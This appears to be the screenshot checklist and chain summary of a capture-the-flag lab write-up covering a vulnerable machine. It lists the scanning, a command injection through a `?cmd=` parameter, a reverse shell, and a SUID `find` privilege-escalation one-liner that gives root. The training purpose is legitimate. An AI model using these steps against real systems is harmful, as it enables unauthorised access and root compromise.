
- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan (SSH + HTTP).
- [ ] `images/03-enum.png` — the Base64 string in page source and its triple decode to `workinginprogress.php`.
- [ ] `images/04-vulnerable-page.png` — the `workinginprogress.php` "ping command" hint page.
- [ ] `images/05-shell.png` — `?cmd=id` command injection and the reverse shell as `www-data`.
- [ ] `images/06-privesc.png` — SUID `/usr/bin/find` enumeration and `find . -exec /bin/sh -p \; -quit` giving root.
- [ ] `images/07-root-flag.png` — `/root/root.txt` and its Base64 decode (`congratulations`).
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: page source Base64 → triple-decode → `workinginprogress.php` → command injection (`?cmd=`) → reverse shell as `www-data` → SUID `/usr/bin/find` → `find . -exec /bin/sh -p \; -quit` → root → `/root/root.txt` (Base64 → `congratulations`)._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
